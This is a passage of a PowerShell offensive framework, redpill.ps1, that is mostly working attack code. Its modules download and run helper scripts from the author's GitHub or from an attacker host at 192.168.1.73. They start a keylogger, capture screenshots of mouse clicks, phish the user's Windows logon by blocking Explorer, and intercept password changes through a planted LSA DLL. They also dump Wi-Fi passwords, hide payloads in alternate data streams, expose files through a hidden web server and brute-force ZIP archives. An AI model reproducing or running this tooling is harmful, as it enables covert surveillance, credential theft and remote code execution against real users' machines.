      Downloads FileName.ps1 script from attacker apache2 (192.168.1.73) into $Env:TMP\FileName.ps1 Local directory
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "syntax : .\redpill.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker ] -Destination [ full\Path\file.ps1 ]"
   Write-Host "Example: .\redpill.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\FileName.ps1`n"
   Start-Sleep -Seconds 2

   ## Download Upload.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Upload.ps1")){## Download Upload.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Upload.ps1 -Destination $Env:TMP\Upload.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Upload.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,9677734375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Upload.ps1"){Remove-Item -Path "$Env:TMP\Upload.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   powershell -File "$Env:TMP\Upload.ps1" -Upload $Upload -ApacheAddr $ApacheAddr -Destination $Destination

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\Upload.ps1"){Remove-Item -Path "$Env:TMP\Upload.ps1" -Force}
}

If($MsgBox -ne "false"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Spawn a msgBox on local host {ComObject}

   .NOTES
      Required Dependencies: Wscript ComObject {native}
      Remark: Double Quotes are Mandatory in -MsgBox value
      Remark: -TimeOut 0 parameter maintains msgbox open.

      MsgBox Button Types
      -------------------
      0 - Show OK button. 
      1 - Show OK and Cancel buttons. 
      2 - Show Abort, Retry, and Ignore buttons. 
      3 - Show Yes, No, and Cancel buttons. 
      4 - Show Yes and No buttons. 
      5 - Show Retry and Cancel buttons. 

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World."

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World." -TimeOut 4
      Spawn message box and close msgbox after 4 seconds time {-TimeOut 4}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World." -ButtonType 4
      Spawns message box with Yes and No buttons {-ButtonType 4}

   .OUTPUTS
      TimeOut  ButtonType           Message
      -------  ----------           -------
      5 (sec)  'Yes and No buttons' 'Hello World.'
   #>

   ## Set Button Type local var
   If($ButtonType -ieq 0){
     $Buttonflag = "'OK button'"
   }ElseIf($ButtonType -ieq 1){
     $Buttonflag = "'OK and Cancel buttons'"
   }ElseIf($ButtonType -ieq 2){
     $Buttonflag = "'Abort, Retry, and Ignore buttons'"
   }ElseIf($ButtonType -ieq 3){
     $Buttonflag = "'Yes, No, and Cancel buttons'"
   }ElseIf($ButtonType -ieq 4){
     $Buttonflag = "'Yes and No buttons'"
   }ElseIf($ButtonType -ieq 5){
     $Buttonflag = "'Retry and Cancel buttons'"
   }

   ## Create Data Table for output
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("TimeOut")|Out-Null
   $mytable.Columns.Add("ButtonType")|Out-Null
   $mytable.Columns.Add("Message")|Out-Null
   $mytable.Rows.Add("$TimeOut (sec)",
                     "$Buttonflag",
                     "'$MsgBox'")|Out-Null

   ## Display Data Table
   $mytable|Format-Table -AutoSize
   ## Execute personalized MessageBox
   (New-Object -ComObject Wscript.Shell).Popup("""$MsgBox""",$TimeOut,"""®redpill - ${CmdletVersion}-dev""",$ButtonType+64)|Out-Null
}

If($SpeakPrank -ne "False"){
If($Rate -gt '10'){$Rate = "10"} ## Speach speed max\min value accepted
If($Volume -gt '100'){$Volume = "100"} ## Speach Volume max\min value accepted

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Speak Prank {SpeechSynthesizer}

   .DESCRIPTION
      Make remote host speak user input sentence (prank)

   .NOTES
      Required Dependencies: SpeechSynthesizer {native}
      Remark: Double Quotes are Mandatory in @arg declarations
      Remark: -Volume controls the speach volume {default: 88}
      Remark: -Rate Parameter configs the SpeechSynthesizer speed

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SpeakPrank "Hello World"
      Make remote host speak "Hello World" {-Rate 1 -Volume 88}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100

   .OUTPUTS
      RemoteHost SpeachSpeed Volume Speak        
      ---------- ----------- ------ -----        
      SKYNET     5           100    'hello world'
   #>

   ## Local Function Variable declarations
   $TimeDat = Get-Date -Format 'HH:mm:ss'
   $RawRate = "-" + "$Rate" -Join ''

   ## Create Data Table for output
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("RemoteHost")|Out-Null
   $mytable.Columns.Add("SpeachSpeed")|Out-Null
   $mytable.Columns.Add("Volume")|Out-Null
   $mytable.Columns.Add("Speak")|Out-Null
   $mytable.Rows.Add("$Remote_hostName",
                     "$Rate",
                     "$Volume",
                     "'$SpeakPrank'")|Out-Null

   ## Display Data Table
   $mytable|Format-Table -AutoSize > $Env:TMP\MyTable.log
   Get-Content -Path "$Env:TMP\MyTable.log"
   Remove-Item -Path "$Env:TMP\MyTable.log" -Force

   ## Add type assembly
   Add-Type -AssemblyName System.speech
   $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
   $speak.Volume = $Volume
   $speak.Rate = $RawRate
   $speak.Speak($SpeakPrank)
}

If($StartWebServer -ieq "Python" -or $StartWebServer -ieq "Powershell"){

   <#
   .SYNOPSIS
      Author: @MarkusScholtes|@r00t-3xp10it
      Helper - Start Local HTTP WebServer (Background)

   .NOTES
      Access WebServer: http://<RHOST>:8080/
      This module download's webserver.ps1 or Start-WebServer.ps1
      to remote host %TMP% and executes it on an hidden terminal prompt
      to allow users to silent browse/read/download files from remote host.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Python
      Downloads webserver.ps1 to %TMP% and executes the webserver.
      Remark: This Module uses Social Enginnering to trick remote host into
      installing python (python http.server) if remote host does not have it.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Python -SPort 8087
      Downloads webserver.ps1 and executes the webserver on port 8087

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Powershell
      Downloads Start-WebServer.ps1 and executes the webserver.
      Remark: Admin privileges are requiered in shell to run the WebServer

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -StartWebServer Powershell -SPort 8087
      Downloads Start-WebServer.ps1 and executes the webserver on port 8087
      Remark: Admin privileges are requiered in shell to run the WebServer
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\redpill.ps1 -StartWebServer Python"
   Write-Host "Example: .\redpill.ps1 -StartWebServer Powershell"
   Write-Host "Example: .\redpill.ps1 -StartWebServer Python -SPort 8087"
   Write-Host "Example: .\redpill.ps1 -StartWebServer Powershell -SPort 8087`n"
   Start-Sleep -Seconds 2

   ## Download StartWebServer.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\StartWebServer.ps1")){## Download StartWebServer.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/StartWebServer.ps1 -Destination $Env:TMP\StartWebServer.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\StartWebServer.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,080078125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\StartWebServer.ps1"){Remove-Item -Path "$Env:TMP\StartWebServer.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   powershell -File "$Env:TMP\StartWebServer.ps1" -StartWebServer $StartWebServer -SPort $SPort

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\StartWebServer.ps1"){Remove-Item -Path "$Env:TMP\StartWebServer.ps1" -Force}
}

If($Keylogger -ieq 'Start' -or $Keylogger -ieq 'Stop'){
$Timer = Get-Date -Format 'HH:mm:ss'

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture remote host keystrokes {void}

   .DESCRIPTION
      This module start recording target system keystrokes
      in background mode and only stops if void.exe binary
      its deleted or is process {void.exe} its stoped.

   .NOTES
      Required Dependencies: void.exe {auto-install}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Keylogger Start
      Download/Execute void.exe in child process
      to be abble to capture system keystrokes

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Keylogger Stop
      Stop keylogger by is process FileName identifier
      and delete keylogger and all respective files/logs

   .OUTPUTS
      StartTime ProcessName PID  LogFile                                   
      --------- ----------- ---  -------                                   
      17:37:17  void.exe    2836 C:\Users\pedro\AppData\Local\Temp\void.log
   #>

   ## Download Keylogger.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Keylogger.ps1")){## Download Keylogger.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Keylogger.ps1 -Destination $Env:TMP\Keylogger.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Keylogger.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,126953125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Keylogger.ps1"){Remove-Item -Path "$Env:TMP\Keylogger.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($Keylogger -ieq "Start"){
      powershell -File "$Env:TMP\Keylogger.ps1" -Keylogger Start
   }ElseIf($Keylogger -ieq "Stop"){
      powershell -File "$Env:TMP\Keylogger.ps1" -Keylogger Stop
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\Keylogger.ps1"){Remove-Item -Path "$Env:TMP\Keylogger.ps1" -Force}
}

If($Mouselogger -ieq "Start"){
## Random FileName generation
$Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
$CaptureFile = "$Env:TMP\SHot-" + "$Rand.zip" ## Capture File Name
If($Timmer -lt '10' -or $Timmer -gt '300'){$Timmer = '10'}
## Set the max\min capture time value
# Remark: The max capture time its 300 secs {5 minuts}

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture screenshots of MouseClicks for 'xx' Seconds

   .DESCRIPTION
      This script allow users to Capture Screenshots of 'MouseClicks'
      with the help of psr.exe native windows 10 (error report service).
      Remark: Capture will be stored under '`$Env:TMP' remote directory.
      'Min capture time its 8 secs the max is 300 and 100 screenshots'.

   .NOTES
      Required Dependencies: psr.exe {native}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Mouselogger Start
      Capture Screenshots of Mouse Clicks for 10 secs {default}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Mouselogger Start -Timmer 28
      Capture Screenshots of remote Mouse Clicks for 28 seconds

   .OUTPUTS
      Capture     Timmer      Storage                                          
      -------     ------      -------                                          
      MouseClicks for 10(sec) C:\Users\pedro\AppData\Local\Temp\SHot-zcsV03.zip
   #>

   ## Syntax Examples
   Write-Host "Syntax Examples" -ForegroundColor Green
   Write-Host "Example: .\redpill.ps1 -Mouselogger Start"
   Write-Host "Example: .\redpill.ps1 -Mouselogger Start -Timmer 10`n"
   Start-Sleep -Seconds 1

   ## Download Mouselogger.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Mouselogger.ps1")){## Download Mouselogger.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Mouselogger.ps1 -Destination $Env:TMP\Mouselogger.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Mouselogger.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,9951171875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Mouselogger.ps1"){Remove-Item -Path "$Env:TMP\Mouselogger.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   powershell -File "$Env:TMP\Mouselogger.ps1" -Mouselogger Start -Timmer $Timmer

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\Mouselogger.ps1"){Remove-Item -Path "$Env:TMP\Mouselogger.ps1" -Force}

}

If($PhishCreds -ieq "Start"){

   <#
   .SYNOPSIS
      Author: @mubix|@r00t-3xp10it
      Helper - Promp the current user for a valid credential.

   .DESCRIPTION
      This CmdLet interrupts EXPLORER process until a valid credential is entered
      correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
      process and leaks the credentials on this terminal shell (Social Engineering).

   .NOTES
      Remark: CredsPhish.ps1 CmdLet its set for 30 fail validations before abort.
      Remark: CredsPhish.ps1 CmdLet requires lmhosts + lanmanserver services running.
      Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -PhishCreds Start
      Prompt the current user for a valid credential.

   .OUTPUTS
      Captured Credentials (logon)
      ----------------------------
      TimeStamp : 01/17/2021 15:26:24
      username  : r00t-3xp10it
      password  : mYs3cr3tP4ss
   #>

   ## Download CredsPhish from my github repository
   Write-Host "[+] Prompt the current user for a valid credential." -ForeGroundColor Green
   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1")){## Check for auxiliary existence
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/CredsPhish.ps1 -Destination $Env:TMP\CredsPhish.ps1 -ErrorAction SilentlyContinue|Out-Null
   }

   ## Check for file download integrity (fail/corrupted downloads)
   $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 7,994140625/KB
   If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 7 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
      ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
      Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
      #If(Test-Path -Path "$Env:TMP\CredsPhish.ps1"){Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force}
      Write-Host "";Start-Sleep -Seconds 1;exit ## exit @redpill
   }

   ## Start Remote Host CmdLet
   powershell -exec bypass -NonInteractive -NoLogo -File $Env:TMP\CredsPhish.ps1
   Write-Host "";Start-Sleep -Seconds 1
}

If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){

   <#
   .SYNOPSIS
      Author: @mubix|@r00t-3xp10it
      Helper - Stealing passwords every time they change {mitre T1174}
      Helper - Search for creds in diferent locations {store|regedit|disk}

   .DESCRIPTION
      -GetPasswords [ Enum ] searchs creds in store\regedit\disk diferent locations.
      -GetPasswords [ Dump ] Explores a native OS notification of when the user
      account password gets changed which is responsible for validating it.
      That means that the user password can be intercepted and logged.

   .NOTES
      -GetPasswords [ Dump ] requires Administrator privileges to add reg keys
      To stop this exploit its required the manual deletion of '0evilpwfilter.dll'
      from 'C:\Windows\System32' and the reset of 'HKLM:\..\Control\lsa' registry key.
      REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetPasswords Enum
      Search for creds in store\regedit\disk {txt\xml\logs} diferent locations

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetPasswords Enum -StartDir `$Env:USERPROFILE
      Search recursive for creds in store\regedit\disk {txt\xml\logs} starting in -StartDir directory

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetPasswords Dump
      Intercepts user changed passwords {logon} by: @mubix

   .OUTPUTS
      Time     Status  ReportFile           VulnDLLPath
      ----     ------  ----------           -----------
      17:49:23 active  C:\Temp\logFile.txt  C:\Windows\System32\0evilpwfilter.dll
   #>


   ## Download GetPasswords.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetPasswords.ps1")){## Download GetPasswords.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetPasswords.ps1 -Destination $Env:TMP\GetPasswords.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetPasswords.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 9){## Corrupted download detected => DefaultFileSize: 9,2373046875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetPasswords.ps1"){Remove-Item -Path "$Env:TMP\GetPasswords.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetPasswords -ieq "Enum"){
      powershell -File "$Env:TMP\GetPasswords.ps1" -GetPasswords Enum -StartDir $StartDir
   }ElseIf($GetPasswords -ieq "Dump"){
      powershell -File "$Env:TMP\GetPasswords.ps1" -GetPasswords Dump
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\GetPasswords.ps1"){Remove-Item -Path "$Env:TMP\GetPasswords.ps1" -Force}
}

If($EOP -ieq "Verbose" -or $EOP -ieq "Enum"){

   <#
   .SYNOPSIS
      Author: @_RastaMouse|r00t-3xp10it {Sherlock v1.3}
      Helper - Find Missing Software Patchs For Privilege Escalation

   .NOTES
      This Module does NOT exploit any EOP vulnerabitys found.
      It will 'report' them and display the exploit-db POC link.
      Remark: Attacker needs to manualy download\execute the POC.
      Sherlock.ps1 GitHub WIKI page: https://tinyurl.com/y4mxe29h

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -EOP Enum
      Scans GroupName Everyone and permissions (F)
      Unquoted Service vuln Paths, Dll-Hijack, etc.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -EOP Verbose
      Scans the Three Group Names and Permissions (F)(W)(M)
      And presents a more elaborate report with extra tests.

   .OUTPUTS
      Title      : TrackPopupMenu Win32k Null Point Dereference
      MSBulletin : MS14-058
      CVEID      : 2014-4113
      Link       : https://www.exploit-db.com/exploits/35101/
      VulnStatus : Appers Vulnerable
   #>

   ## Download Sherlock (@_RastaMouse) from my github repository
   If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1")){## Check if auxiliary exists
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Sherlock.ps1 -Destination $Env:TMP\Sherlock.ps1 -ErrorAction SilentlyContinue|Out-Null
   }

   ## Check for file download integrity (fail/corrupted downloads)
   $CheckInt = Get-Content -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
   $SizeDump = ((Get-Item -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue).length/1KB) ## Default => 84,8359375/KB
   If(-not(Test-Path -Path "$Env:TMP\sherlock.ps1") -or $SizeDump -lt 84 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
      ## Fail to download Sherlock.ps1 using BitsTransfer OR the downloaded file is corrupted
      Write-Host "[abort] fail to download Sherlock.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
      If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
      Start-Sleep -Seconds 1;exit ## exit @redpill
   }

   ## Import-Module (-Force reloads the module everytime)
   $SherlockPath = Test-Path -Path "$Env:TMP\sherlock.ps1" -EA SilentlyContinue
   If($SherlockPath -ieq "True" -and $SizeDump -gt 15){
      Import-Module -Name "$Env:TMP\sherlock.ps1" -Force
      If($EOP -ieq "Verbose"){## Use ALL Sherlock EoP functions
         Write-Host "[i] Please wait, this scan migth take more than 5 minuts!" -ForegroundColor Yellow -BackgroundColor Black
         Start-Sleep -Seconds 1;Use-AllModules FullRecon
      }ElseIf($EOP -ieq "Enum"){## find missing CVE patchs
         Use-AllModules
      }
   }
   
   ## Delete sherlock script from remote system
   If(Test-Path -Path "$Env:TMP\sherlock.ps1"){Remove-Item -Path "$Env:TMP\sherlock.ps1" -Force}
   Write-Host "";Start-Sleep -Seconds 1
}

If($ADS -ieq "Enum" -or $ADS -ieq "Create" -or $ADS -ieq "Exec" -or $ADS -ieq "Clear"){

   <#
   .SYNOPSIS
      Helper - Hidde scripts {txt|bat|ps1|exe} on $DATA records (ADS)
   
   .DESCRIPTION
      Alternate Data Streams (ADS) have been around since the introduction
      of windows NTFS. Basically ADS can be used to hide the presence of a
      secret or malicious file inside the file record of an innocent file.

   .NOTES
      Required Dependencies: Payload.bat|ps1|txt|exe + legit.txt
      This module hiddes {txt|bat|ps1|exe} $DATA inside ADS records.
      Remark: Payload.[extension] + legit.txt must be on the same dir.

   .EXAMPLE
      PS C:\> .\redpill.ps1 -ADS Enum -StreamData "payload.bat" -StartDir "$Env:TMP"
      Search recursive for payload.bat ADS stream record existence starting on -StartDir [ dir ]

   .EXAMPLE
      PS C:\> .\redpill.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.txt"
      Hidde the data of Payload.bat script inside legit.txt ADS $DATA record

   .EXAMPLE
      PS C:\> .\redpill.ps1 -ADS Exec -StreamData "payload.bat" -InTextFile "legit.mp3"
      Execute\Access the alternate data stream of the sellected -InTextFile [ file ]

   .EXAMPLE
      PS C:\> .\redpill.ps1 -ADS Clear -StreamData "Payload.bat" -InTextFile "legit.txt"
      Delete payload.bat ADS $DATA stream from legit.txt text file records

   .OUTPUTS
      AlternateDataStream
      -------------------
      C:\Users\pedro\AppData\Local\Temp\legit.txt

      [cmd prompt] AccessHiddenData
      -----------------------------
      wmic.exe process call create "C:\Users\pedro\AppData\Local\Temp\legit.txt:payload.exe"
   #>

   ## Download AdsMasquerade.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\AdsMasquerade.ps1")){## Download AdsHidde.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AdsMasquerade.ps1 -Destination $Env:TMP\AdsMasquerade.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\AdsMasquerade.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 20){## Corrupted download detected => DefaultFileSize: 20,880859375/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\AdsMasquerade.ps1"){Remove-Item -Path "$Env:TMP\AdsMasquerade.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($ADS -ieq "Enum"){
      powershell -File "$Env:TMP\AdsMasquerade.ps1" -ADS Enum -StreamData "$StreamData" -StartDir "$StartDir"
   }ElseIf($ADS -ieq "Create"){
      powershell -File "$Env:TMP\AdsMasquerade.ps1" -ADS Create -StreamData "$StreamData" -InTextFile "$InTextFile"
   }ElseIf($ADS -ieq "Exec"){
      powershell -File "$Env:TMP\AdsMasquerade.ps1" -ADS Exec -StreamData "$StreamData" -InTextFile "$InTextFile"
   }ElseIf($ADS -ieq "Clear"){
      powershell -File "$Env:TMP\AdsMasquerade.ps1" -ADS Clear -StreamData "$StreamData" -InTextFile "$InTextFile"
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\AdsMasquerade.ps1"){Remove-Item -Path "$Env:TMP\AdsMasquerade.ps1" -Force}
}

If($WifiPasswords -ieq "Dump" -or $WifiPasswords -ieq "ZipDump"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump All SSID Wifi passwords

   .DESCRIPTION
      Module to dump SSID Wifi passwords into terminal windows
      OR dump credentials into a zip archive under `$Env:TMP

   .NOTES
      Required Dependencies: netsh {native}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -WifiPasswords Dump
      Dump ALL Wifi Passwords on this terminal prompt

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -WifiPasswords ZipDump
      Dump Wifi Paswords into a Zip archive on %TMP% {default}

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
      Dump Wifi Paswords into a Zip archive on %APPDATA% remote directory

   .OUTPUTS
      SSID name               Password    
      ---------               --------               
      CampingMilfontesWifi    Milfontes19 
      NOS_Internet_Movel_202E 37067757                                             
      Ondarest                381885C874           
      MEO-968328              310E0CBA14
   #>

   ## Download WifiPasswords.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\WifiPasswords.ps1")){## Download WifiPasswords.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/WifiPasswords.ps1 -Destination $Env:TMP\WifiPasswords.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\WifiPasswords.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,171875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\WifiPasswords.ps1"){Remove-Item -Path "$Env:TMP\WifiPasswords.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($WifiPasswords -ieq "Dump"){
      powershell -File "$Env:TMP\WifiPasswords.ps1" -WifiPasswords Dump -Storage $Storage
   }ElseIf($WifiPasswords -ieq "ZipDump"){
      powershell -File "$Env:TMP\WifiPasswords.ps1" -WifiPasswords ZipDump -Storage $Storage
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\WifiPasswords.ps1"){Remove-Item -Path "$Env:TMP\WifiPasswords.ps1" -Force}
}

If($BruteZip -ne "false"){

   <#
   .SYNOPSIS
      Author: @securethelogs|@r00t-3xp10it
      Helper - Brute force ZIP archives {7z.exe}

   .DESCRIPTION
      This module brute forces ZIP archives with the help of 7z.exe
      It also downloads custom password list from @josh-newton GitHub
      Or accepts User dicionary if stored in `$Env:TMP\passwords.txt

   .NOTES
      Required Dependencies: 7z.exe {manual-install}
      Required Dependencies: `$Env:TMP\passwords.txt {auto|manual}
      Remark: Use double quotes if path contains any empty spaces.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -BruteZip `$Env:USERPROFILE\Desktop\Archive.zip
      Brute forces the zip archive defined by -BruteZip parameter with 7z.exe bin.

   .LINK
      https://github.com/securethelogs/Powershell/tree/master/Redteam
      https://raw.githubusercontent.com/josh-newton/python-zip-cracker/master/passwords.txt
   #>

   ## Local Var declarations
   $Thepasswordis = $null
   $PasFileStatus = $False
   $PassList = "$Env:TMP\passwords.txt"
   $7z = "C:\Program Files\7-Zip\7z.exe"

   If(-not(Test-Path -Path "$BruteZip")){## Make sure Archive exists
      Write-Host "[error] Zip archive not found: $BruteZip!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @redpill
   }Else{## Archive found
      $ZipArchiveName = $BruteZip.Split('\\')[-1] ## Get File Name from Path
      $SizeDump = ((Get-Item -Path "$BruteZip" -EA SilentlyContinue).length/1KB)
      Write-Host "[i] Archive $ZipArchiveName found!"
      Start-Sleep -Seconds 1
   }

   ## Download passwords.txt from @josh-newton github repository
   If(-not(Test-Path -Path "$PassList")){## Check if password list exists
      $PassFile = $PassList.Split('\\')[-1]
      Write-Host "[+] Downloading $PassFile (BITS)"
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/josh-newton/python-zip-cracker/master/passwords.txt -Destination $PassList -ErrorAction SilentlyContinue|Out-Null
   }Else{## User Input dicionary
      $PassFile = $PassList.Split('\\')[-1]
      Write-Host "[i] dicionary $PassFile found!"
      Start-Sleep -Seconds 1
      $PasFileStatus = $True
   }

   If(-not($PasFileStatus -ieq $True)){
      ## Check for file download integrity (fail/corrupted downloads)
      $CheckInt = Get-Content -Path "$PassList" -EA SilentlyContinue
      $SizeDump = ((Get-Item -Path "$PassList" -EA SilentlyContinue).length/1KB) ## default => 4002,8544921875/KB
